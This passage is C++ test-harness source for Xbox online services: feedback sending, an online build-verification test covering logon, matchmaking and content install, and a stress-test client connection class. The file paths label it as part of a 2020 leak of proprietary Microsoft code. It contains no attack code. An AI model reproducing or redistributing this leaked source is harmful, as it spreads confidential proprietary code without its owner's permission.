    CHECKRUN(userMgr.GenerateAndSelectRandomAccounts());

    // Logon the selected accounts.
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection(userMgr.SelectedAccounts(), (DWORD) 5000));
    hr = (XONLINE_S_LOGON_CONNECTION_ESTABLISHED == hr) ? S_OK : E_FAIL;
    bLoggedOn = (SUCCEEDED(hr)) ? true : false;

    static XONLINE_FEEDBACK_TYPE feedbackTypes[] = {
        	XONLINE_FEEDBACK_NEG_NICKNAME,
	        XONLINE_FEEDBACK_NEG_GAMEPLAY,
	        XONLINE_FEEDBACK_NEG_SCREAMING,
	        XONLINE_FEEDBACK_NEG_HARASSMENT,
	        XONLINE_FEEDBACK_NEG_LEWDNESS,
	        XONLINE_FEEDBACK_POS_ATTITUDE,
	        XONLINE_FEEDBACK_POS_SESSION
    };

    for (DWORD userIndex = 0; userIndex < 4 && SUCCEEDED(hr); ++userIndex)
    {
        const_AccountIterator accountIt = userMgr.Account_begin();
        for (; accountIt != userMgr.Account_end() && SUCCEEDED(hr); ++accountIt)
        {
            if (userMgr.UserIsSelected(accountIt->xuid))
            {
                // Not allowed to complain about a local, logged on user.
                continue;
            }

            if (CXLiveUserManager::IsGuestAccount(accountIt))
            {
                // Guests are not allowed to send feedback.
                continue;
            }

            for (   int type = 0;
                    type < sizeof(feedbackTypes) / sizeof(feedbackTypes[0]) && SUCCEEDED(hr);
                    ++type)
            {
                hr = XOnlineFeedbackSend(   userIndex,
                                            accountIt->xuid,
                                            feedbackTypes[type],
                                            pwszNickname,
                                            NULL,
                                            &phTask);

                if (SUCCEEDED(hr))
                {
                    if (phTask != NULL)
                    {
                        // Pump the task.
                        hr = XOnlineTaskContinue(phTask);
                    }
                }
            }
        }
    }

    if (bLoggedOn)
    {
        // Log off.
        HRESULT loggedHr = CXLiveConnectionManager::Instance().Logoff();
        bLoggedOn = false;
    }

    if (bNetworkStarted)
    {
        HRESULT closedHr = CloseNetwork();
        hr = (FAILED(closedHr)) ? closedHr : hr;
        bNetworkStarted = false;
    }
    
    // BUGBUG: Remove this statement when the service is implemented.
    hr = (hr != E_NOTIMPL) ? E_FAIL : E_NOTIMPL;

    return hr;
}

/****************************************************************************
 *
 *  feedback_StartTest
 *
 *  Description:
 *      The Harness Entry into the feedback tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI feedback_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test feedback in the manner it was meant to be called.
    //

    SETLOG( LogHandle, "davidhef", "Online", "feedback", "Basic" );
    EXECUTE( feedback_BasicTest() );
}

/****************************************************************************
 *
 *  feedback_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI feedback_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    feedback_StartTest( NULL );
    feedback_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( feedback )
#pragma data_seg()

BEGIN_EXPORT_TABLE( feedback )
    EXPORT_TABLE_ENTRY( "StartTest", feedback_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", feedback_EndTest )
END_EXPORT_TABLE( feedback )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\inc\bldfiles.h ===
/*----------------------------------------------------------------------------
 *  Copyright  1997 Microsoft.  ALL RIGHTS RESERVED. 
 *----------------------------------------------------------------------------
 *  Date: 10/24/00
 *  Developer: Sean Wohlgemuth
 *----------------------------------------------------------------------------
 */

/*	BuildFilesOfSize - Create a number of files who's names relate to their filesize

	hStart - file size in bytes to create
	dwCount - number of files to create increasing 1 byte per file
	pszPath - path for destination file (example: "T:\\" or T:\\somedir\\")

	Files created are 8.3 and follow the form: XXXXXXXX.YYY
		where YYY is the number of 1024 blocks in this file and
		where XXXXXXXX is the number of remaining bytes excluding 1024 blocks in this file
		XXXXXXXX and YYY are represented in uppercase HEX form with padded 0's.
*/
HRESULT BuildFilesOfSize(unsigned __int64 hStart, DWORD dwCount, char* pszPath);
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinebvt\onlinebvt.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       onlinebvt.cpp
 *  Content:    onlinebvt tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  12/10/01    tristanj Created to test Xbox onlinebvt
 *
 ****************************************************************************/

#include "onlinebvt.h"

/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

HANDLE g_hLog;

/****************************************************************************
 *
 *  onlinebvt_BasicTest
 *
 *  Description:
 *      Basic Test for onlinebvt
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT onlinebvt_BasicTest( void )
{
    HRESULT                 hr              = S_OK;
	CLogonTask              LogonTask;
	CFriendEnumTask		    FriendEnumTask1;
	CMatchSessionCreateTask *pSessionCreateTask = NULL;
	CMatchSearchTask        *pSearchTask = NULL;
	COfferingEnumerateTask  OfferingEnumerateTask;
	CContentInstallTask     *pContentInstallTask = NULL;
	CContentVerifyTask      *pContentVerifyTask = NULL;
	CContentRemoveTask      *pContentRemoveTask = NULL;
	COnlineTimer			Timer;
	XNKID					SessionID;
	XONLINE_FRIEND           *pFriendList = NULL;
	PXONLINEOFFERING_INFO   *rgpEnumInfo;
	PXMATCH_SEARCHRESULT    *rgpSearchResults = NULL;
	DWORD					ServicesArray[] =
	{
		XONLINE_MATCHMAKING_SERVICE,
		XONLINE_BILLING_OFFERING_SERVICE
		// TODO - Add content-download here when it is figured out
	};
	DWORD                   dwServicesCount = sizeof(ServicesArray) / sizeof(DWORD);
	DWORD                   dwFriendCount = 0, dwResultsCount = 0, dwOfferingCount = 0, dwReturnedResults = 0;
	BOOL                    fPartialResults = FALSE;

	// Populate users accounts from users.ini
	hr = COnlineAccounts::Instance()->PopulateUserAccountsHD(NULL, XONLINE_MAX_LOGON_USERS);
	if(hr != S_OK)
	{
		xLog(g_hLog, XLL_FAIL, "Populating user accounts failed.");
		goto Exit;
	}

	//------------------------
	// LOGON STAGE
	//------------------------

	LogonTask.RegisterLogHandle(g_hLog);

	// The logon task will automatically login with as many users as possible

	// Need to add the matchmaking and content services since they aren't included by default
	if(!LogonTask.SetServices(ServicesArray, dwServicesCount))
	{
		hr = E_FAIL;
		goto Exit;
	}

	// Start logon async task
	if(!LogonTask.StartTask())
	{
		hr = E_FAIL;
		goto Exit;
	}

	Timer.SetAllowedTime(MAX_LOGON_TIME);
	Timer.Start();

	// Pump task until complete
	while(!LogonTask.IsConnectionEstablished())
	{
		if(Timer.HasTimeExpired())
			break;

		// Make sure to wait for the work event to test that it is always signalled when necessary
		if(!LogonTask.WaitForWork(Timer.GetTimeRemaining()))
			break;

		LogonTask.TaskContinue();
	}

	if(!LogonTask.IsConnectionEstablished())
	{
		LOGTASKINFO(g_hLog, "Logon timed-out");
		hr = E_FAIL;
		goto Exit;
	}

	LOGTASKINFO(g_hLog, "Auth test: PASSED");

	//------------------------
	// PRESENCE STAGE
	//------------------------

	FriendEnumTask1.RegisterLogHandle(g_hLog);

	// The buddy enum task will automatically use the player at index 0

	// Start buddy enum async task
	if(!FriendEnumTask1.StartTask())
	{
		hr = E_FAIL;
		goto Exit;
	}

	Timer.SetAllowedTime(MAX_FRIEND_ENUM_TIME);
	Timer.Start();

	// Pump task for MAX_FRIEND_ENUM_TIME seconds
	while(!FriendEnumTask1.IsFriendListUpToDate())
	{
		if(Timer.HasTimeExpired())
			break;

		FriendEnumTask1.TaskContinue();
	}

	if(!FriendEnumTask1.IsFriendListUpToDate())
	{
		LOGTASKINFO(g_hLog, "Friend enumeration task didn't report an up-to-date list");
		hr = E_FAIL;
		goto Exit;
	}

	dwFriendCount = FriendEnumTask1.GetLatestFriendList(&pFriendList);

	LOGTASKINFO(g_hLog, "Friend test: PASSED");

	//------------------------
	// MATCH STAGE
	//------------------------

	//
	// Session creation phase
	//

	pSessionCreateTask = new CMatchSessionCreateTask();
	if(!pSessionCreateTask)
	{
		LOGTASKINFO(g_hLog, "Couldn't allocate session creation task");
		hr = E_FAIL;
		goto Exit;
	}

	pSessionCreateTask->RegisterLogHandle(g_hLog);

	// Set 4 public slots, 0 private slots
	pSessionCreateTask->SetAvailableSlots(4, 2, 0, 0);

	// Start match session creation task
	if(!pSessionCreateTask->StartTask())
	{
		hr = E_FAIL;
		goto Exit;
	}

//	Timer.SetAllowedTime(MAX_SESSION_CREATE_TIME);
	Timer.SetAllowedTime(100000000);
	Timer.Start();

	// Pump task for MAX_SESSION_CREATE_TIME seconds
	while(!pSessionCreateTask->IsTaskComplete())
	{
		if(Timer.HasTimeExpired())
			break;

		LogonTask.TaskContinue();
		pSessionCreateTask->TaskContinue();
	}

	if(!pSessionCreateTask->IsTaskComplete())
	{
		LOGTASKINFO(g_hLog, "Session creation timed-out");
		hr = E_FAIL;
		goto Exit;
	}

	pSessionCreateTask->GetSessionInfo(&SessionID, NULL);

	if(*((ULONGLONG *) &SessionID) == 0)
	{
		LOGTASKINFO(g_hLog, "Session ID wasn't set");
		hr = E_FAIL;
		goto Exit;
	}

	//
	// Search phase
	//

	pSearchTask = new CMatchSearchTask();

	pSearchTask->SetSessionIDForSearch(&SessionID);

	// Start match search task
	if(!pSearchTask->StartTask())
	{
		hr = E_FAIL;
		goto Exit;
	}

//	Timer.SetAllowedTime(MAX_SEARCH_TIME);
	Timer.SetAllowedTime(100000000);
	Timer.Start();

	// Pump task for MAX_SESSION_CREATE_TIME seconds
	while(!pSearchTask->IsTaskComplete())
	{
		if(Timer.HasTimeExpired())
			break;

		LogonTask.TaskContinue();
		pSearchTask->TaskContinue();
	}

	if(!pSearchTask->IsTaskComplete())
	{
		LOGTASKINFO(g_hLog, "Search timed-out");
		hr = E_FAIL;
		goto Exit;
	}

	hr = pSearchTask->GetSearchResults(&rgpSearchResults, &dwReturnedResults);
	if(FAILED(hr))
	{
		LOGTASKINFO(g_hLog, "Failed getting search results");
		hr = E_FAIL;
		goto Exit;
	}

	if(dwReturnedResults == 0)
	{
		LOGTASKINFO(g_hLog, "Didn't find hosted session");
		hr = E_FAIL;
		goto Exit;
	}

	delete pSearchTask;
	pSearchTask = NULL;

	delete pSessionCreateTask;
	pSessionCreateTask = NULL;

	LOGTASKINFO(g_hLog, "Match test: PASSED");

	//------------------------
	// OFFERING ENUMERATION STAGE
	//------------------------

	OfferingEnumerateTask.RegisterLogHandle(g_hLog);

	// Start match session creation task
	if(!OfferingEnumerateTask.StartTask())
	{
		hr = E_FAIL;
		goto Exit;
	}

	// Iterate through offering enumeration until there are no more results
	do
	{
		//	Timer.SetAllowedTime(MAX_ENUMERATION_TIME);
		Timer.SetAllowedTime(100000000);
		Timer.Start();
		
		// Pump task for MAX_ENUMERATION_TIME seconds
		do
		{
			if(Timer.HasTimeExpired())
				break;
			
			LogonTask.TaskContinue();
			OfferingEnumerateTask.TaskContinue();
		}while(!OfferingEnumerateTask.IsTaskComplete());
		
		if(!OfferingEnumerateTask.IsTaskComplete())
		{
			LOGTASKINFO(g_hLog, "Offering enumeration timed-out");
			hr = E_FAIL;
			goto Exit;
		}
		
		dwResultsCount = 0;
		fPartialResults = FALSE;
		hr = OfferingEnumerateTask.GetResults(&rgpEnumInfo, &dwResultsCount, &fPartialResults);
		xLog(g_hLog, XLL_INFO, "%u results returned by offering enumeration");

		if(!dwResultsCount)
		{
			LOGTASKINFO(g_hLog, "Offering enumeration didn't return any results");
			hr = E_FAIL;
			goto Exit;
		}


		do
		{
			pContentInstallTask = new CContentInstallTask;
			pContentVerifyTask = new CContentVerifyTask;
			pContentRemoveTask = new CContentRemoveTask;

			if(!pContentInstallTask || !pContentVerifyTask || !pContentRemoveTask)
			{
				LOGTASKINFO(g_hLog, "Couldn't allocate content tasks");
				hr = E_FAIL;
				goto Exit;
			}

			pContentInstallTask->RegisterLogHandle(g_hLog);
			pContentVerifyTask->RegisterLogHandle(g_hLog);
			pContentRemoveTask->RegisterLogHandle(g_hLog);

		    pContentInstallTask->SetOfferingID((rgpEnumInfo[dwOfferingCount])->OfferingId);
			pContentVerifyTask->SetOfferingID((rgpEnumInfo[dwOfferingCount])->OfferingId);
			pContentRemoveTask->SetOfferingID((rgpEnumInfo[dwOfferingCount])->OfferingId);

			++dwOfferingCount;

			//
			// Start installing the content
			//

			xLog(g_hLog, XLL_INFO, "Installing offering %u", dwOfferingCount);
			if(!pContentInstallTask->StartTask())
			{
				LOGTASKINFO(g_hLog, "Error starting content download");
				hr = E_FAIL;
				goto Exit;
			}

			//	Timer.SetAllowedTime(MAX_INSTALL_TIME);
			Timer.SetAllowedTime(100000000);
			Timer.Start();

			// Pump task for MAX_INSTALL_TIME seconds
			do
			{
				if(Timer.HasTimeExpired())
					break;
				
				LogonTask.TaskContinue();
				pContentInstallTask->TaskContinue();
			}while(!pContentInstallTask->IsTaskComplete());
			
			if(!pContentInstallTask->IsTaskComplete())
			{
				LOGTASKINFO(g_hLog, "Content install timed-out");
				hr = E_FAIL;
				goto Exit;
			}

			if(FAILED(pContentInstallTask->GetLastResult()))
			{
				LOGTASKINFO(g_hLog, "Content install failed");
				hr = E_FAIL;
				goto Exit;
			}

			delete pContentInstallTask;
			pContentInstallTask = NULL;

			xLog(g_hLog, XLL_INFO, "Installed offering %u successfully", dwOfferingCount);

			//
			// Start verifing the content
			//

			xLog(g_hLog, XLL_INFO, "Verifying offering %u", dwOfferingCount);
			if(!pContentVerifyTask->StartTask())
			{
				LOGTASKINFO(g_hLog, "Error starting content verification");
				hr = E_FAIL;
				goto Exit;
			}

			//	Timer.SetAllowedTime(MAX_VERIFICATION_TIME);
			Timer.SetAllowedTime(100000000);
			Timer.Start();

			// Pump task for MAX_VERIFICATION_TIME seconds
			do
			{
				if(Timer.HasTimeExpired())
					break;
				
				LogonTask.TaskContinue();
				pContentVerifyTask->TaskContinue();
			}while(!pContentVerifyTask->IsTaskComplete());
			
			if(!pContentVerifyTask->IsTaskComplete())
			{
				LOGTASKINFO(g_hLog, "Content verification timed-out");
				hr = E_FAIL;
				goto Exit;
			}

			if(FAILED(pContentVerifyTask->GetLastResult()))
			{
				LOGTASKINFO(g_hLog, "Content verification failed");
				hr = E_FAIL;
				goto Exit;
			}

			delete pContentVerifyTask;
			pContentVerifyTask = NULL;

			xLog(g_hLog, XLL_INFO, "Verified offering %u successfully", dwOfferingCount);

			//
			// Start remove the content
			//

			xLog(g_hLog, XLL_INFO, "Removing offering %u", dwOfferingCount);
			if(!pContentRemoveTask->StartTask())
			{
				LOGTASKINFO(g_hLog, "Error starting content removal");
				hr = E_FAIL;
				goto Exit;
			}

			//	Timer.SetAllowedTime(MAX_REMOVAL_TIME);
			Timer.SetAllowedTime(100000000);
			Timer.Start();

			// Pump task for MAX_REMOVAL_TIME seconds
			do
			{
				if(Timer.HasTimeExpired())
					break;
				
				LogonTask.TaskContinue();
				pContentRemoveTask->TaskContinue();
			}while(!pContentRemoveTask->IsTaskComplete());
			
			if(!pContentRemoveTask->IsTaskComplete())
			{
				LOGTASKINFO(g_hLog, "Content removal timed-out");
				hr = E_FAIL;
				goto Exit;
			}

			if(FAILED(pContentRemoveTask->GetLastResult()))
			{
				LOGTASKINFO(g_hLog, "Content removal failed");
				hr = E_FAIL;
				goto Exit;
			}

			delete pContentRemoveTask;
			pContentRemoveTask = NULL;

			xLog(g_hLog, XLL_INFO, "Removed offering %u successfully", dwOfferingCount);

		} while(--dwResultsCount);


	} while(!FAILED(hr) && fPartialResults);

	if(FAILED(hr))
	{
		LOGTASKINFOHR(g_hLog, "Offering enumeration failed", hr);
		hr = E_FAIL;
		goto Exit;
	}

	//------------------------
	// MAINTAIN LOGON
	//------------------------
	
	//	Stay online for another minute
	Timer.SetAllowedTime(60000);
	Timer.Start();

	while(LogonTask.IsConnectionEstablished())
	{
		if(Timer.HasTimeExpired())
			break;

		// Make sure to wait for the work event to test that it is always signalled when necessary
		if(LogonTask.WaitForWork(30000))
			LogonTask.TaskContinue();
	}

Exit:

	pContentInstallTask ? delete pContentInstallTask : 0;
	pContentVerifyTask ? delete pContentVerifyTask : 0;
	pContentRemoveTask ? delete pContentRemoveTask : 0;

	pSessionCreateTask ? delete pSessionCreateTask : 0;
	pSearchTask ? delete pSearchTask : 0;


    //
    // Return the Hresult
    //

	if(FAILED(hr))
		xLog(g_hLog, XLL_FAIL, "Test failed");
	else
		xLog(g_hLog, XLL_PASS, "Test passed");

    return hr;
}

/****************************************************************************
 *
 *  onlinebvt_StartTest
 *
 *  Description:
 *      The Harness Entry into the onlinebvt tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI onlinebvt_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;
    XDEVICE_PREALLOC_TYPE deviceTypes[] = {
               {XDEVICE_TYPE_GAMEPAD, 4},
               {XDEVICE_TYPE_MEMORY_UNIT, 8}
    };

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

	XInitDevices(sizeof(deviceTypes) / sizeof(XDEVICE_PREALLOC_TYPE), deviceTypes);

	XNetAddRef();

	hr = XOnlineStartup(NULL);

    //
    // Test onlinebvt in the mannor it was meant to be called
    //

    if ( SHOULDRUNTEST( "onlinebvt", "Basic" ) )
    {
        SETLOG( LogHandle, "tristanj", "Online", "onlinebvt", "Basic" );
        EXECUTE( onlinebvt_BasicTest() );
    }

	hr = XOnlineCleanup();

	XNetRelease();
}

/****************************************************************************
 *
 *  onlinebvt_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI onlinebvt_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    onlinebvt_StartTest( NULL );
    onlinebvt_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( onlinebvt )
#pragma data_seg()

BEGIN_EXPORT_TABLE( onlinebvt )
    EXPORT_TABLE_ENTRY( "StartTest", onlinebvt_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", onlinebvt_EndTest )
END_EXPORT_TABLE( onlinebvt )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinebvt\onlinebvt.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       onlinebvt.h
 *  Content:    onlinebvt utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  12/10/01    tristanj Created to test Xbox onlinebvt
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xlog.h>
#include <macros.h>
#include <xtestlib.h>
#include <xnetref.h>
#include "LogonTask.h"
#include "FriendEnumTask.h"
#include "MatchSessionCreateTask.h"
#include "OfferingEnumerateTask.h"
#include "ContentInstallTask.h"
#include "ContentVerifyTask.h"
#include "ContentRemoveTask.h"
#include "MatchSearchTask.h"
#include "OnlineAccounts.h"
#include "OnlineTimer.h"

#define MAX_LOGON_TIME           30000
#define MAX_FRIEND_ENUM_TIME      10000
#define MAX_SESSION_CREATE_TIME  10000
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\integration\onlinestress\ClientConnection.cpp ===
// ClientConnection.cpp: implementation of the CClientConnection class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientConnection.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CClientConnection::CClientConnection()
{
	m_fNew = FALSE;
	m_fDisconnected = FALSE;
	m_IncomingHeartbeatTimer.SetAllowedTime(XONSTRESS_HEARTBEAT_TIMEOUT);
	m_OutgoingHeartbeatTimer.SetAllowedTime(XONSTRESS_HEARTBEAT_XMIT_TIME);
	m_IncomingHeartbeatTimer.Start();
	m_IncomingHeartbeatTimer.Start();
	m_ClientSocket = INVALID_SOCKET;
	memset(&m_ClientAddr, 0, sizeof(m_ClientAddr));
	m_UserVector.reserve(XONLINE_MAX_LOGON_USERS);
}

CClientConnection::~CClientConnection()
{

}

CClientConnection::CClientConnection(const CClientConnection &ClientConnection)
{
	m_fNew = ClientConnection.m_fNew;
	m_fDisconnected = ClientConnection.m_fDisconnected;
	m_IncomingHeartbeatTimer = ClientConnection.m_IncomingHeartbeatTimer;
	m_OutgoingHeartbeatTimer = ClientConnection.m_OutgoingHeartbeatTimer;
	m_ClientSocket = ClientConnection.m_ClientSocket;
	memcpy(&m_ClientAddr, &(ClientConnection.m_ClientAddr), sizeof(m_ClientAddr));
	m_UserVector =  ClientConnection.m_UserVector;
}

CClientConnection& CClientConnection::operator = (const CClientConnection& ClientConnection)
{
	m_fNew = ClientConnection.m_fNew;
	m_fDisconnected = ClientConnection.m_fDisconnected;
	m_IncomingHeartbeatTimer = ClientConnection.m_IncomingHeartbeatTimer;
	m_OutgoingHeartbeatTimer = ClientConnection.m_OutgoingHeartbeatTimer;
	m_ClientSocket = ClientConnection.m_ClientSocket;
	memcpy(&m_ClientAddr, &(ClientConnection.m_ClientAddr), sizeof(m_ClientAddr));
	m_UserVector = ClientConnection.m_UserVector;

	return *this;
}

bool CClientConnection::operator ==(CClientConnection &ClientConnection)
{
	if(memcmp(&m_ClientAddr, &(ClientConnection.m_ClientAddr), sizeof(m_ClientAddr)))
		return false;

	return true;
}

bool CClientConnection::operator <(CClientConnection &ClientConnection)
{
	return (m_ClientAddr.inaOnline.S_un.S_addr < ClientConnection.m_ClientAddr.inaOnline.S_un.S_addr);
}

/****************************************************************************
 *
 *  PackIntoBuffer
 *
 *  Description:
 *      Packs all of the CClientConnection information into a buffer for transmission
 *      over the wire to another client
 *
 *  Arguments:
 *      CHAR                *pBuff              Buffer to hold the user information.  If this
 *                                              parameter is NULL and a non-NULL pdwBuffSize is
 *                                              provided, then the function will fill pdwBuffSize
 *                                              with the required size necessary
 *      DWORD               *pdwBuffSize        Holds the size of the provided buffer. On output
 *                                              this parameter will contain either the required size
 *                                              (if the provided size was insufficient) or the
 *                                              ammount of space that was actually used
 *
 *  Returns:  
 *      S_OK if the client was succesfully packed into the buffer
 *      S_FALSE if a buffer was supplied but it was too small to hold the data
 *      E_FAIL if bad parameters were passed in or a system error occured
 *
 ****************************************************************************/
HRESULT CClientConnection::PackIntoBuffer(CHAR *pBuff, DWORD *pdwBuffSize)
{
	PXONSTRESS_CLIENT_HEADER pClientHeader = (PXONSTRESS_CLIENT_HEADER) pBuff;
	XONSTRESS_USERVECTOR::iterator UserCurrent, UserEnd;
	DWORD dwRequiredSize = 0, dwUsedSize = 0, dwUserCount = 0, dwCurrentUserSize = 0;

	if(!pdwBuffSize)
		return E_FAIL;

	dwRequiredSize = sizeof(XONSTRESS_CLIENT_HEADER);
	
	// Only pack user information if this is a client ADD message
	if(!m_fDisconnected)
	{
		// Loop through all users in the user vector and add to the total required size for the client packet
		for(UserCurrent = m_UserVector.begin(), UserEnd = m_UserVector.end(); UserCurrent != UserEnd; ++UserCurrent)
		{
			dwCurrentUserSize = 0;
			UserCurrent->PackIntoBuffer(NULL, &dwCurrentUserSize);
			dwRequiredSize += dwCurrentUserSize;
			++dwUserCount;
		}
	}
	
	if(*pdwBuffSize < dwRequiredSize)
	{
		*pdwBuffSize = dwRequiredSize;
		return S_FALSE;
	}

	*pdwBuffSize = dwRequiredSize;

	// Fill in the client header
	pClientHeader->dwClientSize = dwRequiredSize;
	memcpy(&(pClientHeader->ClientAddr), &m_ClientAddr, sizeof(XNADDR));
	pClientHeader->dwUserCount = dwUserCount;
	pClientHeader->bOperation = m_fDisconnected ? XONSTRESS_CLIENT_DELETE : XONSTRESS_CLIENT_ADD;

	// Only pack user information if this is a client ADD message
	if(!m_fDisconnected)
	{
		dwUsedSize += sizeof(XONSTRESS_CLIENT_HEADER);
		
		// Loop through all users in the user vector and add each to the client packet
		for(UserCurrent = m_UserVector.begin(), UserEnd = m_UserVector.end(); UserCurrent != UserEnd; ++UserCurrent)
		{
			dwCurrentUserSize = dwRequiredSize - dwUsedSize;
			UserCurrent->PackIntoBuffer(pBuff + dwUsedSize, &dwCurrentUserSize);
			dwUsedSize += dwCurrentUserSize;
		}
	}

	return S_OK;
}

/****************************************************************************
 *
 *  UnpackFromBuffer
 *
 *  Description:
 *      Unpacks a client information packet received over the wire into a new
 *      CClientConnection object
 *
 *  Arguments:
 *      CHAR                *pBuff              Buffer containing the received user information packet
 *      DWORD               *pdwBuffSize        On input, indicates the size of the received packet
 *                                              On output, indicates the size used to build the client object
 *
 *  Returns:  
 *      S_OK if the client object was succesfully unpacked from the buffer
 *      E_FAIL if bad parameters were passed in or a system error occured
 *
 ****************************************************************************/
HRESULT CClientConnection::UnpackFromBuffer(CHAR *pBuff, DWORD *pdwBuffSize)
{
	PXONSTRESS_CLIENT_HEADER pClientHeader = (PXONSTRESS_CLIENT_HEADER) pBuff;
	CSessionUser *pNewUser = NULL;
	HRESULT hr = S_OK;
	DWORD dwCurrentClient = 0, dwUsedSize = 0, dwUserBufferSize = 0;

	if(m_UserVector.size() != 0)
		ClearUsers();

	if((*pdwBuffSize < sizeof(XONSTRESS_CLIENT_HEADER)) || !pBuff)
		return E_FAIL;

	if(pClientHeader->dwClientSize > *pdwBuffSize)
		return E_FAIL;

	memcpy(&m_ClientAddr, &(pClientHeader->ClientAddr), sizeof(XNADDR));
	m_fDisconnected = (pClientHeader->bOperation == XONSTRESS_CLIENT_DELETE);

	// If this is a client disconnect, ignore any user information present
	if(!m_fDisconnected)
	{
		
		if(pClientHeader->dwUserCount > XONLINE_MAX_LOGON_USERS)
			return E_FAIL;
		
		dwUsedSize += sizeof(XONSTRESS_CLIENT_HEADER);
		
		// Unpack each user from the received packet and add to the user vector
		for(dwCurrentClient = 0;dwCurrentClient < pClientHeader->dwUserCount; ++dwCurrentClient)
		{
			pNewUser = new CSessionUser;
			
			dwUserBufferSize = *pdwBuffSize - dwUsedSize;
			if((hr = pNewUser->UnpackFromBuffer(pBuff + dwUsedSize, &dwUserBufferSize)) != S_OK)
			{
				delete pNewUser;
				goto Exit;
			}
			
			m_UserVector.push_back(*pNewUser);
			delete pNewUser;
			
			dwUsedSize += dwUserBufferSize;
		}
	}

Exit:

	return hr;
}

/****************************************************************************
 *
 *  AddUser
 *
 *  Description:
 *      Adds a user to the list of users associated with this client
 *
 *  Arguments:
 *      CSessionUser        &SessionUser        Reference to the session user to be associated
 *                                              with this client
 *
 *  Returns:  
 *      S_OK if the user was succesfully associated with the client
 *      S_FALSE if the client already has the maximum number of users
 *      E_FAIL if bad parameters were passed in or a system error occured
 *
 ****************************************************************************/
HRESULT CClientConnection::AddUser(CSessionUser &SessionUser)
{
	if(m_UserVector.size() == XONLINE_MAX_LOGON_USERS)
		return S_FALSE;

	m_UserVector.push_back(SessionUser);

	return S_OK;
}

/****************************************************************************
 *
 *  ClearUsers
 *
 *  Description:
 *      Erases all existing users from the client connection object
 *
 *  Arguments:
 *      (none)
 *
 *  Returns:  
 *      (none)
 *
 ****************************************************************************/
void CClientConnection::ClearUsers()
{
	XONSTRESS_USERVECTOR::iterator UserBegin, UserEnd;

	UserBegin = m_UserVector.begin();
	UserEnd = m_UserVector.end();

	m_UserVector.erase(UserBegin, UserEnd);
}

void CClientConnection::SetSocket(SOCKET Socket)
{
	m_ClientSocket = Socket;
}

SOCKET CClientConnection::GetSocket()
{
	return m_ClientSocket;
}

void CClientConnection::SetAsNew()
{
	m_fNew = TRUE;
}

void CClientConnection::SetAsOld()
{
	m_fNew = FALSE;
}

BOOL CClientConnection::IsNew()
{
	return m_fNew;
}

void CClientConnection::ResetIncomingHeartbeatTimer()
{
	m_IncomingHeartbeatTimer.Start();
}

void CClientConnection::ResetOutgoingHeartbeatTimer()
{
	m_OutgoingHeartbeatTimer.Start();
}

void CClientConnection::SetAsDisconnected()
{
	m_fDisconnected = TRUE;
	if(m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}
}

BOOL CClientConnection::IsDisconnected()
{
	return m_fDisconnected;
}

BOOL CClientConnection::IsIncomingHearbeatExpired()
{
	return m_IncomingHeartbeatTimer.HasTimeExpired();
}

BOOL CClientConnection::IsOutgoingHeartbeatExpired()
{
